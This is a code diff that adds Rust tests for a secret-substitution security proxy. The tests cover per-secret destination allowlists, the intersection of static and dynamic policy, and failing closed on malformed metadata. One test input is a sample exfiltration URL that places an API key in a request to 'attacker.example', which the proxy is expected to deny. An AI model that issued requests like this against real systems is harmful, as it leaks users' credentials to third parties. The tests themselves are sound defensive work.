@@ -1132,6 +1132,122 @@ mod tests {
         )
     }
 
+    fn metadata_store(
+        secret: &str,
+        allowed_destinations: &[&str],
+    ) -> secrets_client::SecretMetadataStore {
+        let mut store = secrets_client::SecretMetadataStore::default();
+        store.secrets.insert(
+            secret.to_string(),
+            secrets_client::SecretMetadata {
+                name: secret.to_string(),
+                allowed_destinations: allowed_destinations
+                    .iter()
+                    .map(|value| value.to_string())
+                    .collect(),
+            },
+        );
+        store
+    }
+
+    #[test]
+    fn destination_metadata_allows_matching_host() {
+        let proxy = tokio::runtime::Runtime::new().unwrap().block_on(async {
+            SecurityProxy::new(
+                GatewayConfig::default(),
+                ScannerConfig::default(),
+                RateLimitConfig::default(),
+            )
+            .await
+        });
+        let metadata = metadata_store("OPENAI", &["api.openai.com", "*.openai.com"]);
+
+        assert!(proxy.is_destination_allowed("OPENAI", "api.openai.com", &metadata));
+        assert!(proxy.is_destination_allowed("OPENAI", "foo.openai.com", &metadata));
+    }
+
+    #[tokio::test]
+    async fn destination_metadata_denies_before_secret_resolver() {
+        let proxy = test_proxy(GatewayConfig::default()).await;
+        let metadata = metadata_store("OPENAI", &["api.openai.com"]);
+
+        let err = proxy
+            .resolve_and_substitute(
+                "https://attacker.example/?key={{secret:OPENAI}}",
+                Some("attacker.example"),
+                Some(&metadata),
+            )
+            .await
+            .expect_err("disallowed dynamic metadata destination must fail closed");
+
+        assert!(
+            err.contains("not allowed at destination"),
+            "denial should happen before resolver lookup; got {err}"
+        );
+        assert!(
+            !err.contains("not found in env or fnox"),
+            "secret resolver must not run for denied destinations: {err}"
+        );
+    }
+
+    #[test]
+    fn static_and_dynamic_destination_policies_intersect() {
+        let proxy = tokio::runtime::Runtime::new().unwrap().block_on(async {
+            SecurityProxy::new(
+                GatewayConfig {
+                    secret_destination_allowlist: std::collections::HashMap::from([(
+                        "OPENAI".to_string(),
+                        vec!["api.openai.com".to_string()],
+                    )]),
+                    ..Default::default()
+                },
+                ScannerConfig::default(),
+                RateLimitConfig::default(),
+            )
+            .await
+        });
+        let metadata = metadata_store("OPENAI", &["upload.openai.com"]);
+
+        assert!(
+            !proxy.is_destination_allowed("OPENAI", "api.openai.com", &metadata),
+            "dynamic metadata must be able to narrow static TOML policy"
+        );
+        assert!(
+            !proxy.is_destination_allowed("OPENAI", "upload.openai.com", &metadata),
+            "static TOML policy must be able to narrow dynamic metadata"
+        );
+    }
+
+    #[test]
+    fn unreadable_destination_metadata_fails_closed() {
+        static ENV_MUTEX: std::sync::Mutex<()> = std::sync::Mutex::new(());
+        let _guard = ENV_MUTEX.lock().unwrap();
+        let dir = tempfile::TempDir::new().unwrap();
+        let metadata_path = dir.path().join("secret-metadata.json");
+        std::fs::write(&metadata_path, "not-json").unwrap();
+        let previous = std::env::var_os("CALCIFORGE_SECRET_METADATA_FILE");
+        // SAFETY: this test serializes access to the process environment with
+        // ENV_MUTEX for the full duration of the override.
+        unsafe {
+            std::env::set_var("CALCIFORGE_SECRET_METADATA_FILE", &metadata_path);
+        }
+
+        let result = SecurityProxy::load_secret_metadata("api.openai.com");
+
+        // SAFETY: same ENV_MUTEX invariant as above.
+        unsafe {
+            if let Some(previous) = previous {
+                std::env::set_var("CALCIFORGE_SECRET_METADATA_FILE", previous);
+            } else {
+                std::env::remove_var("CALCIFORGE_SECRET_METADATA_FILE");
+            }
+        }
+        assert!(
+            result.is_err(),
+            "malformed dynamic metadata must fail closed instead of falling back to unrestricted substitution"
+        );
+    }
+
     // ── Fetch mode ───────────────────────────────────────────────────────
 
     #[tokio::test]
